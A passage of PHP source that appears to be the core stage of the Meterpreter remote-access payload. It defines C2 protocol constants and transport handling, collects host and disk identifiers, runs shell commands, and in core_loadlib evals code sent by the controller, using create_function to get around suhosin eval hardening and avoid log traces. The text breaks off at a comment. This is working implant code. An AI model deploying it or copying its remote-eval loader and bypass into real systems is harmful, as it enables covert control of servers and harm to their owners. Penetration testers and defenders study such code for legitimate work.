/*<?php /**/

# Everything that needs to be global has to be made so explicitly so we can run
# inside a call to create_user_func($user_input);

# global list of channels
if (!isset($GLOBALS['channels'])) {
  $GLOBALS['channels'] = array();
}

# global mapping of channels to channelized processes.  This is how we know
# if we need to kill a process when it's channel has been closed.
if (!isset($GLOBALS['channel_process_map'])) {
  $GLOBALS['channel_process_map'] = array();
}

# global resource map.  This is how we know whether to use socket or stream
# functions on a channel.
if (!isset($GLOBALS['resource_type_map'])) {
  $GLOBALS['resource_type_map'] = array();
}

# global map of sockets to the associated peer host.
if (!isset($GLOBALS['udp_host_map'])) {
  $GLOBALS['udp_host_map'] = array();
}

# global list of resources we need to watch in the main select loop
if (!isset($GLOBALS['readers'])) {
  $GLOBALS['readers'] = array();
}

# global map of command ids to callable handlers
if (!isset($GLOBALS['id2f'])) {
  $GLOBALS['id2f'] = array();
}

function register_command($c, $i) {
  global $id2f;
  if (! in_array($i, $id2f)) {
    $id2f[$i] = $c;
  }
}

# Debugging payload definitions
define("MY_DEBUGGING", false);
define("MY_DEBUGGING_LOG_FILE_PATH", false);

function my_debugging_enabled() {
  return (isset($GLOBALS['DEBUGGING']) ? $GLOBALS['DEBUGGING'] : MY_DEBUGGING) ? true : false;
}

function my_debugging_path() {
  if (isset($GLOBALS['DEBUGGING_LOG_FILE_PATH']) && $GLOBALS['DEBUGGING_LOG_FILE_PATH']) {
    return $GLOBALS['DEBUGGING_LOG_FILE_PATH'];
  }
  return MY_DEBUGGING_LOG_FILE_PATH;
}

function my_logfile($str) {
  $path = my_debugging_path();
  if (my_debugging_enabled() && $path) {
    if (!isset($GLOBALS['logfile'])) {
      $GLOBALS['logfile'] = fopen($path, 'a');

      if (!$GLOBALS['logfile']) {
        my_print("Failed to open debug log file");
      }
    }

    if ($GLOBALS['logfile']) {
      fwrite($GLOBALS['logfile'], "$str\n");
    }
  }
}

function my_print($str) {
  if (my_debugging_enabled()) {
    error_log($str);
    my_logfile($str);
  }
}

my_print("Evaling main meterpreter stage");

# Be very careful not to put a # anywhere that isn't a comment (e.g. inside a
# string) as the comment remover will completely break this payload

function dump_array($arr, $name=null) {
  if (is_null($name)) {
    $name = "Array";
  }
  my_print(sprintf("$name (%s)", count($arr)));
  foreach ($arr as $key => $val) {
    if (is_array($val)) {
      # recurse
      dump_array($val, "{$name}[{$key}]");
    } else {
      my_print(sprintf("    $key ($val)"));
    }
  }
}
function dump_readers() {
  global $readers;
  dump_array($readers, 'Readers');
}
function dump_resource_map() {
  global $resource_type_map;
  dump_array($resource_type_map, 'Resource map');
}
function dump_channels($extra="") {
  global $channels;
  dump_array($channels, 'Channels '.$extra);
}


# Doesn't exist before php 4.3
if (!function_exists("file_get_contents")) {
  function file_get_contents($file) {
    $f = @fopen($file,"rb");
    $contents = false;
    if ($f) {
      do { $contents .= fgets($f); } while (!feof($f));
    }
    fclose($f);
    return $contents;
  }
}

# Renamed in php 4.3
if (!function_exists('socket_set_option')) {
  function socket_set_option($sock, $type, $opt, $value) {
    socket_setopt($sock, $type, $opt, $value);
  }
}

#
# Payload definitions - CONFIG_BLOCK is patched by the framework with a
# base64-encoded TLV configuration packet.
#
define("CONFIG_BLOCK", "");

#
# Constants
#
define("AES_256_CBC", 'aes-256-cbc');
define("ENC_NONE", 0);
define("ENC_AES256", 1);

define("PACKET_TYPE_REQUEST",         0);
define("PACKET_TYPE_RESPONSE",        1);
define("PACKET_TYPE_PLAIN_REQUEST",  10);
define("PACKET_TYPE_PLAIN_RESPONSE", 11);

define("ERROR_SUCCESS", 0);
define("ERROR_FAILURE", 1);

define("CHANNEL_CLASS_BUFFERED", 0);
define("CHANNEL_CLASS_STREAM",   1);
define("CHANNEL_CLASS_DATAGRAM", 2);
define("CHANNEL_CLASS_POOL",     3);


##
# Windows Constants
##
define("WIN_AF_INET", 2);
define("WIN_AF_INET6", 23);

#
# TLV Meta Types
#
define("TLV_META_TYPE_NONE",       (   0   ));
define("TLV_META_TYPE_STRING",     (1 << 16));
define("TLV_META_TYPE_UINT",       (1 << 17));
define("TLV_META_TYPE_RAW",        (1 << 18));
define("TLV_META_TYPE_BOOL",       (1 << 19));
define("TLV_META_TYPE_QWORD",      (1 << 20));
define("TLV_META_TYPE_COMPRESSED", (1 << 29));
define("TLV_META_TYPE_GROUP",      (1 << 30));
define("TLV_META_TYPE_COMPLEX",    (1 << 31));
# not defined in original
define("TLV_META_TYPE_MASK",    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));

#
# TLV base starting points
#
define("TLV_RESERVED",   0);
define("TLV_EXTENSIONS", 20000);
define("TLV_USER",       40000);
define("TLV_TEMP",       60000);


#
# TLV Specific Types
#
define("TLV_TYPE_ANY",                 TLV_META_TYPE_NONE   |   0);
define("TLV_TYPE_COMMAND_ID",          TLV_META_TYPE_UINT   |   1);
define("TLV_TYPE_REQUEST_ID",          TLV_META_TYPE_STRING |   2);
define("TLV_TYPE_EXCEPTION",           TLV_META_TYPE_GROUP  |   3);
define("TLV_TYPE_RESULT",              TLV_META_TYPE_UINT   |   4);

define("TLV_TYPE_STRING",              TLV_META_TYPE_STRING |  10);
define("TLV_TYPE_UINT",                TLV_META_TYPE_UINT   |  11);
define("TLV_TYPE_BOOL",                TLV_META_TYPE_BOOL   |  12);

define("TLV_TYPE_LENGTH",              TLV_META_TYPE_UINT   |  25);
define("TLV_TYPE_DATA",                TLV_META_TYPE_RAW    |  26);
define("TLV_TYPE_FLAGS",               TLV_META_TYPE_UINT   |  27);

define("TLV_TYPE_CHANNEL_ID",          TLV_META_TYPE_UINT   |  50);
define("TLV_TYPE_CHANNEL_TYPE",        TLV_META_TYPE_STRING |  51);
define("TLV_TYPE_CHANNEL_DATA",        TLV_META_TYPE_RAW    |  52);
define("TLV_TYPE_CHANNEL_DATA_GROUP",  TLV_META_TYPE_GROUP  |  53);
define("TLV_TYPE_CHANNEL_CLASS",       TLV_META_TYPE_UINT   |  54);

define("TLV_TYPE_SEEK_WHENCE",         TLV_META_TYPE_UINT   |  70);
define("TLV_TYPE_SEEK_OFFSET",         TLV_META_TYPE_UINT   |  71);
define("TLV_TYPE_SEEK_POS",            TLV_META_TYPE_UINT   |  72);

define("TLV_TYPE_EXCEPTION_CODE",      TLV_META_TYPE_UINT   | 300);
define("TLV_TYPE_EXCEPTION_STRING",    TLV_META_TYPE_STRING | 301);

define("TLV_TYPE_LIBRARY_PATH",        TLV_META_TYPE_STRING | 400);
define("TLV_TYPE_TARGET_PATH",         TLV_META_TYPE_STRING | 401);

define("TLV_TYPE_MACHINE_ID",          TLV_META_TYPE_STRING | 460);
define("TLV_TYPE_UUID",                TLV_META_TYPE_RAW    | 461);
define("TLV_TYPE_SESSION_GUID",        TLV_META_TYPE_RAW    | 462);

# Packet encryption
define("TLV_TYPE_RSA_PUB_KEY",         TLV_META_TYPE_RAW    | 550);
define("TLV_TYPE_SYM_KEY_TYPE",        TLV_META_TYPE_UINT   | 551);
define("TLV_TYPE_SYM_KEY",             TLV_META_TYPE_RAW    | 552);
define("TLV_TYPE_ENC_SYM_KEY",         TLV_META_TYPE_RAW    | 553);

# C2/Transport configuration
define("TLV_TYPE_SESSION_EXPIRY",      TLV_META_TYPE_UINT   | 700);
define("TLV_TYPE_DEBUG_LOG",           TLV_META_TYPE_STRING | 702);
define("TLV_TYPE_C2",                  TLV_META_TYPE_GROUP  | 704);
define("TLV_TYPE_C2_COMM_TIMEOUT",     TLV_META_TYPE_UINT   | 705);
define("TLV_TYPE_C2_RETRY_TOTAL",      TLV_META_TYPE_UINT   | 706);
define("TLV_TYPE_C2_RETRY_WAIT",       TLV_META_TYPE_UINT   | 707);
define("TLV_TYPE_C2_URL",              TLV_META_TYPE_STRING | 708);
define("TLV_TYPE_C2_URI",              TLV_META_TYPE_STRING | 709);
define("TLV_TYPE_C2_PROXY_URL",        TLV_META_TYPE_STRING | 710);
define("TLV_TYPE_C2_PROXY_USER",       TLV_META_TYPE_STRING | 711);
define("TLV_TYPE_C2_PROXY_PASS",       TLV_META_TYPE_STRING | 712);
define("TLV_TYPE_C2_GET",              TLV_META_TYPE_GROUP  | 713);
define("TLV_TYPE_C2_POST",             TLV_META_TYPE_GROUP  | 714);
define("TLV_TYPE_C2_HEADERS",          TLV_META_TYPE_STRING | 715);
define("TLV_TYPE_C2_UA",               TLV_META_TYPE_STRING | 716);
define("TLV_TYPE_C2_CERT_HASH",        TLV_META_TYPE_RAW    | 717);
define("TLV_TYPE_C2_PREFIX",           TLV_META_TYPE_RAW    | 718);
define("TLV_TYPE_C2_SUFFIX",           TLV_META_TYPE_RAW    | 719);
define("TLV_TYPE_C2_ENC",              TLV_META_TYPE_UINT   | 720);
define("TLV_TYPE_C2_PREFIX_SKIP",      TLV_META_TYPE_UINT   | 721);
define("TLV_TYPE_C2_SUFFIX_SKIP",      TLV_META_TYPE_UINT   | 722);
define("TLV_TYPE_C2_UUID_COOKIE",      TLV_META_TYPE_STRING | 723);
define("TLV_TYPE_C2_UUID_GET",         TLV_META_TYPE_STRING | 724);
define("TLV_TYPE_C2_UUID_HEADER",      TLV_META_TYPE_STRING | 725);
define("TLV_TYPE_C2_UUID",             TLV_META_TYPE_STRING | 726);

# C2 encoding constants
define("C2_ENCODING_NONE",   0);
define("C2_ENCODING_B64",    1);
define("C2_ENCODING_B64URL", 2);

# ---------------------------------------------------------------
# --- THIS CONTENT WAS GENERATED BY A TOOL @ 2020-05-01 05:33:39 UTC
# IDs for core
define('EXTENSION_ID_CORE', 0);
define('COMMAND_ID_CORE_CHANNEL_CLOSE', 1);
define('COMMAND_ID_CORE_CHANNEL_EOF', 2);
define('COMMAND_ID_CORE_CHANNEL_INTERACT', 3);
define('COMMAND_ID_CORE_CHANNEL_OPEN', 4);
define('COMMAND_ID_CORE_CHANNEL_READ', 5);
define('COMMAND_ID_CORE_CHANNEL_SEEK', 6);
define('COMMAND_ID_CORE_CHANNEL_TELL', 7);
define('COMMAND_ID_CORE_CHANNEL_WRITE', 8);
define('COMMAND_ID_CORE_CONSOLE_WRITE', 9);
define('COMMAND_ID_CORE_ENUMEXTCMD', 10);
define('COMMAND_ID_CORE_GET_SESSION_GUID', 11);
define('COMMAND_ID_CORE_LOADLIB', 12);
define('COMMAND_ID_CORE_MACHINE_ID', 13);
define('COMMAND_ID_CORE_MIGRATE', 14);
define('COMMAND_ID_CORE_NATIVE_ARCH', 15);
define('COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION', 16);
define('COMMAND_ID_CORE_PATCH_UUID', 17);
define('COMMAND_ID_CORE_PIVOT_ADD', 18);
define('COMMAND_ID_CORE_PIVOT_REMOVE', 19);
define('COMMAND_ID_CORE_PIVOT_SESSION_DIED', 20);
define('COMMAND_ID_CORE_SET_SESSION_GUID', 21);
define('COMMAND_ID_CORE_SET_UUID', 22);
define('COMMAND_ID_CORE_SHUTDOWN', 23);
define('COMMAND_ID_CORE_TRANSPORT_ADD', 24);
define('COMMAND_ID_CORE_TRANSPORT_CHANGE', 25);
define('COMMAND_ID_CORE_TRANSPORT_GETCERTHASH', 26);
define('COMMAND_ID_CORE_TRANSPORT_LIST', 27);
define('COMMAND_ID_CORE_TRANSPORT_NEXT', 28);
define('COMMAND_ID_CORE_TRANSPORT_PREV', 29);
define('COMMAND_ID_CORE_TRANSPORT_REMOVE', 30);
define('COMMAND_ID_CORE_TRANSPORT_SETCERTHASH', 31);
define('COMMAND_ID_CORE_TRANSPORT_SET_TIMEOUTS', 32);
define('COMMAND_ID_CORE_TRANSPORT_SLEEP', 33);
# ---------------------------------------------------------------

$GLOBALS['disabled_functions_array'] = array();
function can_call_function($function){
  global $disabled_functions_array;
  if (empty($disabled_functions_array)) {
    $disabled_functions = @ini_get('disable_functions');
    if($disabled_functions != ""){
      $disabled_functions = preg_replace('/[, ]+/', ',', $disabled_functions);
      $disabled_functions_array = array_map('trim', explode(',', $disabled_functions));
    }
  }
  if (in_array($function, $disabled_functions_array)) {
        my_print("Can't call $function, as it's disabled.");
    return FALSE;
  }
  if (!function_exists($function)) {
        my_print("Can't call $function, as it doesn't exist.");
    return FALSE;
  }
  if (!is_callable($function)) {
        my_print("Can't call $function, as it's not callable.");
    return FALSE;
  }
  return TRUE;
}

function my_cmd($cmd) {
  if (can_call_function('shell_exec')) {
    return shell_exec($cmd);
  }
  return '';
}

function is_windows() {
  return (strtoupper(substr(PHP_OS,0,3)) == "WIN");
}

function is_linux() {
  return (strtoupper(substr(PHP_OS,0,3)) == "LIN");
}

##
# Worker functions
##

if (!function_exists('core_channel_open')) {
  register_command('core_channel_open', COMMAND_ID_CORE_CHANNEL_OPEN);
  function core_channel_open($req, &$pkt) {
    $type_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_TYPE);

    my_print("Client wants a ". $type_tlv['value'] ." channel, i'll see what i can do");

    # Doing it this way allows extensions to create new channel types without
    # needing to modify the core code.
    $handler = "channel_create_". $type_tlv['value'];
    if ($type_tlv['value'] && is_callable($handler)) {
      my_print("Calling {$handler}");
      $ret = $handler($req, $pkt);
    } else {
      my_print("I don't know how to make a ". $type_tlv['value'] ." channel. =(");
      $ret = ERROR_FAILURE;
    }

    return $ret;
  }
}

# Works for streams
if (!function_exists('core_channel_eof')) {
  register_command('core_channel_eof', COMMAND_ID_CORE_CHANNEL_EOF);
  function core_channel_eof($req, &$pkt) {
    my_print("doing channel eof");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $c = get_channel_by_id($chan_tlv['value']);

    if ($c) {
      if (eof($c[1])) {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 1));
      } else {
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, 0));
      }
      return ERROR_SUCCESS;
    } else {
      return ERROR_FAILURE;
    }
  }
}

# Works
if (!function_exists('core_channel_read')) {
  register_command('core_channel_read', COMMAND_ID_CORE_CHANNEL_READ);
  function core_channel_read($req, &$pkt) {
    my_print("doing channel read");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $len = $len_tlv['value'];
    $data = channel_read($id, $len);
    if ($data === false) {
      $res = ERROR_FAILURE;
    } else {
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_DATA, $data));
      $res = ERROR_SUCCESS;
    }
    return $res;
  }
}

# Works
if (!function_exists('core_channel_write')) {
  register_command('core_channel_write', COMMAND_ID_CORE_CHANNEL_WRITE);
  function core_channel_write($req, &$pkt) {
    #my_print("doing channel write");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $data_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_DATA);
    $len_tlv = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id = $chan_tlv['value'];
    $data = $data_tlv['value'];
    $len = $len_tlv['value'];

    $wrote = channel_write($id, $data, $len);
    if ($wrote === false) {
      return ERROR_FAILURE;
    } else {
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_LENGTH, $wrote));
      return ERROR_SUCCESS;
    }
  }
}

#
# This is called when the client wants to close a channel explicitly.
#
if (!function_exists('core_channel_close')) {
  register_command('core_channel_close', COMMAND_ID_CORE_CHANNEL_CLOSE);
  function core_channel_close($req, &$pkt) {
    global $channel_process_map;
    # XXX remove the closed channel from $readers
    my_print("doing channel close");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    $c = get_channel_by_id($id);
    if ($c) {
      # We found a channel, close its stdin/stdout/stderr
      channel_close_handles($id);

      # This is an explicit close from the client, always remove it from the
      # list, even if it has data.
      channel_remove($id);

      # if the channel we're closing is associated with a process, kill the
      # process
      # Make sure the stdapi function for closing a process handle is
      # available before trying to clean up
      if (array_key_exists($id, $channel_process_map) and is_callable('close_process')) {
        close_process($channel_process_map[$id]);
      }
      return ERROR_SUCCESS;
    }
    dump_channels("after close");

    return ERROR_FAILURE;
  }
}

#
# Destroy a channel and all associated handles.
#
if (!function_exists('channel_close_handles')) {
  function channel_close_handles($cid) {
    global $channels;

    # Sanity check - make sure a channel with the given cid exists
    if (!array_key_exists($cid, $channels)) {
      return;
    }
    $c = $channels[$cid];
    for($i = 0; $i < 3; $i++) {
      #my_print("closing channel fd $i, {$c[$i]}");
      if (array_key_exists($i, $c) && is_resource($c[$i])) {
        close($c[$i]);
        # Make sure the main loop doesn't select on this resource after we
        # close it.
        remove_reader($c[$i]);
      }
    }

    # axe it from the list only if it doesn't have any leftover data
    if (strlen($c['data']) == 0) {
      channel_remove($cid);
    }
  }
}

function channel_remove($cid) {
  global $channels;
  unset($channels[$cid]);
}

if (!function_exists('core_channel_interact')) {
  register_command('core_channel_interact', COMMAND_ID_CORE_CHANNEL_INTERACT);
  function core_channel_interact($req, &$pkt) {
    global $readers;

    my_print("doing channel interact");
    $chan_tlv = packet_get_tlv($req, TLV_TYPE_CHANNEL_ID);
    $id = $chan_tlv['value'];

    # True means start interacting, False means stop
    $toggle_tlv = packet_get_tlv($req, TLV_TYPE_BOOL);

    $c = get_channel_by_id($id);
    if ($c) {
      if ($toggle_tlv['value']) {
        # Start interacting.  If we're already interacting with this
        # channel, it's an error and we should return failure.
        if (!in_array($c[1], $readers)) {
          # stdout
          add_reader($c[1]);
          # Make sure we don't add the same resource twice in the case
          # that stdin == stderr
          if (array_key_exists(2, $c) && $c[1] != $c[2]) {
            # stderr
            add_reader($c[2]);
          }
          $ret = ERROR_SUCCESS;
        } else {
          # Already interacting
          $ret = ERROR_FAILURE;
        }
      } else {
        # Stop interacting.  If we're not interacting yet with this
        # channel, it's an error and we should return failure.
        if (in_array($c[1], $readers)) {
          remove_reader($c[1]); # stdout
          remove_reader($c[2]); # stderr
          $ret = ERROR_SUCCESS;
        } else {
          # Not interacting.  This is technically failure, but it seems
          # the client sends us two of these requests in quick succession
          # causing the second one to always return failure.  When that
          # happens we fail to clean up properly, so always return
          # success here.
          $ret = ERROR_SUCCESS;
        }
      }
    } else {
      # Not a valid channel
      my_print("Trying to interact with an invalid channel");
      $ret = ERROR_FAILURE;
    }
    return $ret;
  }
}

function interacting($cid) {
  global $readers;
  $c = get_channel_by_id($cid);
  if (in_array($c[1], $readers)) {
    return true;
  }
  return false;
}


if (!function_exists('core_shutdown')) {
  register_command('core_shutdown', COMMAND_ID_CORE_SHUTDOWN);
  function core_shutdown($req, &$pkt) {
    my_print("doing core shutdown");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_BOOL, true));
    $GLOBALS['running'] = false;
    return ERROR_SUCCESS;
  }
}

# zlib support is not compiled in by default, so this makes sure the library
# isn't compressed before eval'ing it
# TODO: check for zlib support and decompress if possible
if (!function_exists('core_loadlib')) {
  register_command('core_loadlib', COMMAND_ID_CORE_LOADLIB);
  function core_loadlib($req, &$pkt) {
    global $id2f;
    my_print("doing core_loadlib");
    $data_tlv = packet_get_tlv($req, TLV_TYPE_DATA);
    if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
      return ERROR_FAILURE;
    }
    $tmp = $id2f;
    # We might not be able to use `eval` here because of some hardening
    # (for example, suhosin), so we walk around by using `create_function` instead,
    # but since this funcis deprecated since php 7.2+, we're not using it
    # when we can avoid it, since it might leave some traces in the log files.
    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval') && can_call_function('create_function')) {
      $suhosin_bypass=create_function('', $data_tlv['value']);
      $suhosin_bypass();
    } else {
      eval($data_tlv['value']);
    }
    $new = array_diff($id2f, $tmp);
    foreach ($new as $id => $func) {
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $id));
    }

    return ERROR_SUCCESS;
  }
}


if (!function_exists('core_enumextcmd')) {
  register_command('core_enumextcmd', COMMAND_ID_CORE_ENUMEXTCMD);
  function core_enumextcmd($req, &$pkt) {
    my_print("doing core_enumextcmd");

    global $id2f;

    $id_start_array = packet_get_tlv($req, TLV_TYPE_UINT);
    $id_start = $id_start_array['value'];
    $id_end_array = packet_get_tlv($req, TLV_TYPE_LENGTH);
    $id_end = $id_end_array['value'] + $id_start;

    foreach ($id2f as $id => $ext_cmd) {
      my_print("core_enumextcmd - checking " . $ext_cmd . " as " . $id);
      list($ext_name, $cmd) = explode("_", $ext_cmd, 2);
      if ($id_start < $id && $id < $id_end) {
        my_print("core_enumextcmd - adding " . $ext_cmd . " as " . $id);
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_UINT, $id));
      }
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_set_uuid')) {
  register_command('core_set_uuid', COMMAND_ID_CORE_SET_UUID);
  function core_set_uuid($req, &$pkt) {
    my_print("doing core_set_uuid");
    $new_uuid = packet_get_tlv($req, TLV_TYPE_UUID);
    if ($new_uuid != null) {
      $GLOBALS['UUID'] = $new_uuid['value'];
      my_print("New UUID is {$GLOBALS['UUID']}");
    }
    return ERROR_SUCCESS;
  }
}


function get_hdd_label() {
  foreach (scandir('/dev/disk/by-id/') as $file) {
    foreach (array("ata-", "mb-") as $prefix) {
      if (strpos($file, $prefix) === 0) {
        return substr($file, strlen($prefix));
      }
    }
  }
  return "";
}

function der_to_pem($der_data) {
   $pem = chunk_split(base64_encode($der_data), 64, "\n");
   $pem = "-----BEGIN PUBLIC KEY-----\n".$pem."-----END PUBLIC KEY-----\n";
   return $pem;
}

if (!function_exists('core_negotiate_tlv_encryption')) {
  register_command('core_negotiate_tlv_encryption', COMMAND_ID_CORE_NEGOTIATE_TLV_ENCRYPTION);
  function core_negotiate_tlv_encryption($req, &$pkt) {
    if (supports_aes()) {
      my_print("AES functionality is supported");
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY_TYPE, ENC_AES256));
      $GLOBALS['AES_ENABLED'] = false;
      $GLOBALS['AES_KEY'] = rand_bytes(32);
      if (can_call_function('openssl_pkey_get_public') && can_call_function('openssl_public_encrypt')) {
        my_print("Encryption via public key is supported");
        $pub_key_tlv = packet_get_tlv($req, TLV_TYPE_RSA_PUB_KEY);
        if ($pub_key_tlv != null) {
          $key = openssl_pkey_get_public(der_to_pem($pub_key_tlv['value']));
          $enc = '';
          openssl_public_encrypt($GLOBALS['AES_KEY'], $enc, $key, OPENSSL_PKCS1_PADDING);
          packet_add_tlv($pkt, create_tlv(TLV_TYPE_ENC_SYM_KEY, $enc));
          return ERROR_SUCCESS;
        }
      }

      # add the raw aes key at this point as it means the encrypt version didn't go out.
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_SYM_KEY, $GLOBALS['AES_KEY']));
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_get_session_guid')) {
  register_command('core_get_session_guid', COMMAND_ID_CORE_GET_SESSION_GUID);
  function core_get_session_guid($req, &$pkt) {
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_GUID, $GLOBALS['SESSION_GUID']));
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_set_session_guid')) {
  register_command('core_set_session_guid', COMMAND_ID_CORE_SET_SESSION_GUID);
  function core_set_session_guid($req, &$pkt) {
    my_print("doing core_set_session_guid");
    $new_guid = packet_get_tlv($req, TLV_TYPE_SESSION_GUID);
    if ($new_guid != null) {
      $GLOBALS['SESSION_ID'] = $new_guid['value'];
      my_print("New Session GUID is {$GLOBALS['SESSION_GUID']}");
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_machine_id')) {
  register_command('core_machine_id', COMMAND_ID_CORE_MACHINE_ID);
  function core_machine_id($req, &$pkt) {
    my_print("doing core_machine_id");
    if (can_call_function('gethostname')) {
      # introduced in 5.3
      $machine_id = gethostname();
    } elseif(can_call_function('php_uname')) {
      $machine_id = php_uname('n');
    } else {
      $machine_id = getenv('HOSTNAME');
    }
    $serial = "";

    if (is_windows()) {
      # It's dirty, but there's not really a nicer way of doing this on windows. Make sure
      # it's lowercase as this is what the other meterpreters use.
      $output = strtolower(shell_exec("vol %SYSTEMDRIVE%"));
      $serial = preg_replace('/.*serial number is ([a-z0-9]{4}-[a-z0-9]{4}).*/s', '$1', $output);
    } else {
      $serial = get_hdd_label();
    }

    packet_add_tlv($pkt, create_tlv(TLV_TYPE_MACHINE_ID, $serial.":".$machine_id));
    return ERROR_SUCCESS;
  }


  ##
  # Channel Helper Functions
  ##
}

if (!function_exists('core_patch_uuid')) {
  register_command('core_patch_uuid', COMMAND_ID_CORE_PATCH_UUID);
  function core_patch_uuid($req, &$pkt) {
    my_print("doing core_patch_uuid");
    $cur_idx = $GLOBALS['current_transport_idx'];
    $transport = &$GLOBALS['transport_list'][$cur_idx];
    if ($transport['type'] != 'http') {
      return ERROR_FAILURE;
    }
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_UUID);
    if ($tlv == null) { return ERROR_FAILURE; }
    $new_uuid = $tlv['value'];
    $transport['c2_uuid'] = $new_uuid;
    $parts = parse_url($transport['url']);
    if (isset($parts['scheme']) && isset($parts['host'])) {
      $port = isset($parts['port']) ? ':' . $parts['port'] : '';
      $transport['url'] = $parts['scheme'] . '://' . $parts['host'] . $port . '/' . $new_uuid;
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_list')) {
  register_command('core_transport_list', COMMAND_ID_CORE_TRANSPORT_LIST);
  function core_transport_list($req, &$pkt) {
    my_print("doing core_transport_list");
    $expiry = $GLOBALS['session_expiry_end'] - time();
    if ($expiry < 0) { $expiry = 0; }
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_SESSION_EXPIRY, $expiry));
    # Emit current first, then rotate forward (matches Python ordering)
    $cur = $GLOBALS['current_transport_idx'];
    $count = count($GLOBALS['transport_list']);
    for ($i = 0; $i < $count; $i++) {
      $idx = ($cur + $i) % $count;
      $t = $GLOBALS['transport_list'][$idx];
      packet_add_tlv($pkt, create_tlv(TLV_TYPE_C2, tlv_pack_transport_group($t)));
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_next')) {
  register_command('core_transport_next', COMMAND_ID_CORE_TRANSPORT_NEXT);
  function core_transport_next($req, &$pkt) {
    my_print("doing core_transport_next");
    $new_idx = transport_next_idx();
    if ($new_idx == $GLOBALS['current_transport_idx']) {
      return ERROR_FAILURE;
    }
    request_transport_switch($new_idx);
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_prev')) {
  register_command('core_transport_prev', COMMAND_ID_CORE_TRANSPORT_PREV);
  function core_transport_prev($req, &$pkt) {
    my_print("doing core_transport_prev");
    $new_idx = transport_prev_idx();
    if ($new_idx == $GLOBALS['current_transport_idx']) {
      return ERROR_FAILURE;
    }
    request_transport_switch($new_idx);
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_add')) {
  register_command('core_transport_add', COMMAND_ID_CORE_TRANSPORT_ADD);
  function core_transport_add($req, &$pkt) {
    my_print("doing core_transport_add");
    $t = parse_transport_from_request($req);
    if ($t == null) { return ERROR_FAILURE; }
    # Insert before the current transport; current_transport_idx shifts forward
    # to keep pointing at the same transport object.
    $cur = $GLOBALS['current_transport_idx'];
    array_splice($GLOBALS['transport_list'], $cur, 0, array($t));
    $GLOBALS['current_transport_idx'] = $cur + 1;
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_remove')) {
  register_command('core_transport_remove', COMMAND_ID_CORE_TRANSPORT_REMOVE);
  function core_transport_remove($req, &$pkt) {
    my_print("doing core_transport_remove");
    $tlv = packet_get_tlv($req, TLV_TYPE_C2_URL);
    if ($tlv == null) { return ERROR_FAILURE; }
    $url = $tlv['value'];
    $cur_idx = $GLOBALS['current_transport_idx'];
    if ($GLOBALS['transport_list'][$cur_idx]['url'] == $url) {
      # Can't remove the active transport
      return ERROR_FAILURE;
    }
    $rm_idx = transport_find_idx_by_url($url);
    if ($rm_idx < 0) { return ERROR_FAILURE; }
    array_splice($GLOBALS['transport_list'], $rm_idx, 1);
    if ($rm_idx < $cur_idx) {
      $GLOBALS['current_transport_idx']--;
    }
    return ERROR_SUCCESS;
  }
}

if (!function_exists('core_transport_change')) {
  register_command('core_transport_change', COMMAND_ID_CORE_TRANSPORT_CHANGE);
  function core_transport_change($req, &$pkt) {
    my_print("doing core_transport_change");
    $t = parse_transport_from_request($req);
    if ($t == null) { return ERROR_FAILURE; }
    # Insert AFTER the current transport so the response still goes out on
    # the old one. Request a switch to the newly-inserted index.
    $cur = $GLOBALS['current_transport_idx'];
    array_splice($GLOBALS['transport_list'], $cur + 1, 0, array($t));
    request_transport_switch($cur + 1);
    return ERROR_SUCCESS;
  }
}

$channels = array();

function register_channel($in, $out=null, $err=null) {
  global $channels;
  if ($out == null) { $out = $in; }
  if ($err == null) { $err = $out; }
  $channels[] = array(0 => $in, 1 => $out, 2 => $err, 'type' => get_rtype($in), 'data' => '');

  # Grab the last index and use it as the new ID.
  $id = end(array_keys($channels));
  my_print("Created new channel $in, with id $id");
  return $id;
}

#
# Channels look like this:
#
# Array
# (
#   [0] => Array
#       (
#            [0] => Resource id #12
#            [1] => Resource id #13
#            [2] => Resource id #14
#            [type] => 'stream'
#            [data] => '...'
#       )
# )
#
function get_channel_id_from_resource($resource) {
  global $channels;
  if (empty($channels)) {
    return false;
  }
  foreach ($channels as $i => $chan_ary) {
    if (in_array($resource, $chan_ary)) {
      my_print("Found channel id $i");
      return $i;
    }
  }
  return false;
}

function &get_channel_by_id($chan_id) {
  global $channels;
  my_print("Looking up channel id $chan_id");
  #dump_channels("in get_channel_by_id");
  if (array_key_exists($chan_id, $channels)) {
    my_print("Found one");
    return $channels[$chan_id];
  } else {
    return false;
  }
}

# Write data to the channel's stdin
